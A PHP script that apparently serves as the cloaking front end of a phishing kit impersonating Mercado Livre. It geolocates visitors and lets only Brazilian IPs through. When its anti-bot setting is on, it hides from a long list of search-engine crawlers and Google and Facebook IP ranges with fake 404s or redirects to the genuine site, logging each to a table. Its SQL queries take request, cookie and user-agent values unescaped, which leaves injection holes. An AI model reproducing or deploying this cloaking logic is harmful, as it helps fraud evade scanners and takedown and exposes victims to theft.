<?php

	include_once "conn.php";
	include_once "functions.php";
	error_reporting(0);
	
	$ip = $_SERVER['REMOTE_ADDR'];	

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
	curl_setopt($ch, CURLOPT_POSTREDIR, 3);
	curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, "http://extreme-ip-lookup.com/json/".$ip);
	$result = curl_exec($ch);
	curl_close($ch);

	$pais = explode('"countryCode" : "', $result);
	$pais = explode('"', $pais[1]);
	
	if ($ip != "::1") {
    	if ($pais[0] != "BR") {
			query("INSERT INTO x9 (ip, user_agent) VALUES ('".$_SERVER['REMOTE_ADDR']."', '".$_SERVER['HTTP_USER_AGENT']."')");
			header('Location: https://www.mercadolivre.com.br');
			exit();
		}
    }

	$antiboot = query("SELECT antiboot FROM config");
	$boot = assoc($antiboot);

	if ($boot['antiboot'] == 1) {
		$agentsInvalids = array(
			'Google',
			'msnbot',
			'Rambler',
			'Yahoo',
			'AbachoBOT',
			'Accoona',
			'AcoiRobot',
			'ASPSeek',
			'CrocCrawler',
			'Dumbot',
			'FAST-WebCrawler',
			'GeonaBot',
			'Gigabot',
			'Lycos',
			'MSRBOT',
			'Scooter',
			'Altavista',
			'IDBot',
			'eStyle',
			'Scrubby',
			'008',
			'ABACHOBot',
			'Accoona-AI-Agent',
			'AddSugarSpiderBot',
			'AnyApexBot',
			'Arachmo',
			'B-l-i-t-z-B-O-T',
			'Baiduspider',
			'BecomeBot',
			'BeslistBot',
			'BillyBobBot',
			'Bimbot',
			'Bingbot',
			'BlitzBOT',
			'boitho.com-dc',
			'boitho.com-robot',
			'btbot',
			'CatchBot',
			'Cerberian Drtrs',
			'Charlotte',
			'ConveraCrawler',
			'cosmos',
			'Covario IDS',
			'DataparkSearch',
			'DiamondBot',
			'Discobot',
			'Dotbot',
			'EARTHCOM.info',
			'EmeraldShield.com WebBot',
			'envolk[ITS]spider',
			'EsperanzaBot',
			'Exabot',
			'FAST Enterprise Crawler',
			'FAST-WebCrawler',
			'FDSE robot',
			'FindLinks',
			'FurlBot',
			'FyberSpider',
			'g2crawler',
			'Gaisbot',
			'GalaxyBot',
			'genieBot',
			'Gigabot',
			'Girafabot',
			'Googlebot',
			'Googlebot-Image',
			'GurujiBot',
			'HappyFunBot',
			'hl_ftien_spider',
			'Holmes',
			'htdig',
			'iaskspider',
			'ia_archiver',
			'iCCrawler',
			'ichiro',
			'igdeSpyder',
			'IRLbot',
			'IssueCrawler',
			'Jaxified Bot',
			'Jyxobot',
			'KoepaBot',
			'L.webis',
			'LapozzBot',
			'Larbin',
			'LDSpider',
			'LexxeBot',
			'Linguee Bot',
			'LinkWalker',
			'lmspider',
			'lwp-trivial',
			'mabontland',
			'magpie-crawler',
			'Mediapartners-Google',
			'MJ12bot',
			'MLBot',
			'Mnogosearch',
			'mogimogi',
			'MojeekBot',
			'Moreoverbot',
			'Morning Paper',
			'msnbot',
			'MSRBot',
			'MVAClient',
			'mxbot',
			'NetResearchServer',
			'NetSeer Crawler',
			'NewsGator',
			'NG-Search',
			'nicebot',
			'noxtrumbot',
			'Nusearch Spider',
			'NutchCVS',
			'Nymesis',
			'obot',
			'oegp',
			'omgilibot',
			'OmniExplorer_Bot',
			'OOZBOT',
			'Orbiter',
			'PageBitesHyperBot',
			'Peew',
			'polybot',
			'Pompos',
			'PostPost',
			'Psbot',
			'PycURL',
			'Qseero',
			'Radian6',
			'RAMPyBot',
			'RufusBot',
			'SandCrawler',
			'SBIder',
			'ScoutJet',
			'Scrubby',
			'SearchSight',
			'Seekbot',
			'semanticdiscovery',
			'Sensis Web Crawler',
			'SEOChat::Bot',
			'SeznamBot',
			'Shim-Crawler',
			'ShopWiki',
			'Shoula robot',
			'silk',
			'Sitebot',
			'Snappy',
			'sogou spider',
			'Sosospider',
			'Speedy Spider',
			'Sqworm',
			'StackRambler',
			'suggybot',
			'SurveyBot',
			'SynooBot',
			'Teoma',
			'TerrawizBot',
			'TheSuBot',
			'Thumbnail.CZ robot',
			'TinEye',
			'truwoGPS',
			'TurnitinBot',
			'TweetedTimes Bot',
			'TwengaBot',
			'updated',
			'Urlfilebot',
			'Vagabondo',
			'VoilaBot',
			'Vortex',
			'voyager',
			'VYU2',
			'webcollage',
			'Websquash.com',
			'wf84',
			'WoFindeIch Robot',
			'WomlpeFactory',
			'Xaldon_WebSpider',
			'yacy',
			'Yahoo! Slurp',
			'Yahoo! Slurp China',
			'YahooSeeker',
			'YahooSeeker-Testing',
			'YandexBot',
			'YandexImages',
			'YandexMetrika',
			'Yasaklibot',
			'Yeti',
			'YodaoBot',
			'yoogliFetchAgent',
			'YoudaoBot',
			'Zao',
			'Zealbot',
			'zspider',
			'ZyBorg',
		);

		foreach ($agentsInvalids as $agent) {
			if (strpos($_SERVER['HTTP_USER_AGENT'], $agent)) {
				query("INSERT INTO x9 (ip, user_agent) VALUES ('".$_SERVER['REMOTE_ADDR']."', '".$_SERVER['HTTP_USER_AGENT']."')");
				header("HTTP/1.0 404 Not Found");
				echo "<h1>404 Not Found</h1>";
				echo "The page that you have requested could not be found.";
				exit();
			}
		}

		$ip = str_replace(".", "", $_SERVER['REMOTE_ADDR']);
		$ip = substr($ip, 0, 5);

		$ips_fb = array(31132,31136,31137,31138,66220,69631,69171,74119,17325,20415);
		$ips_gl = array(64233,66102,66249,72141,72142,74125,20985,21623,64689);

		if (in_array($ip, $ips_gl)) {
			query("INSERT INTO x9 (ip, user_agent) VALUES ('".$_SERVER['REMOTE_ADDR']."', 'Google')");
			header('Location: https://www.mercadolivre.com.br');
			exit();
		}

		if (in_array($ip, $ips_fb)) {
			query("INSERT INTO x9 (ip, user_agent) VALUES ('".$_SERVER['REMOTE_ADDR']."', 'Facebook')");
			header('Location: https://www.mercadolivre.com.br');
			exit();
		}
	}else{
		session_start();

		if (!empty($_GET['id'])) {
			$id = $_GET['id'];
			$query = query("SELECT * FROM produtos WHERE id = '$id'");
			$row = assoc($query);
			header('Location: https://produto.mercadolivre.com.br/'.$row['url']);
			exit();
		}elseif (!empty($_COOKIE['id'])) {
			$id = $_COOKIE['id'];
			$query = query("SELECT * FROM produtos WHERE id = '$id'");
			$row = assoc($query);
			header('Location: https://produto.mercadolivre.com.br/'.$row['url']);
			exit();
		}else{
			header('Location: https://www.mercadolivre.com.br');
			exit();
		}			
	}

?>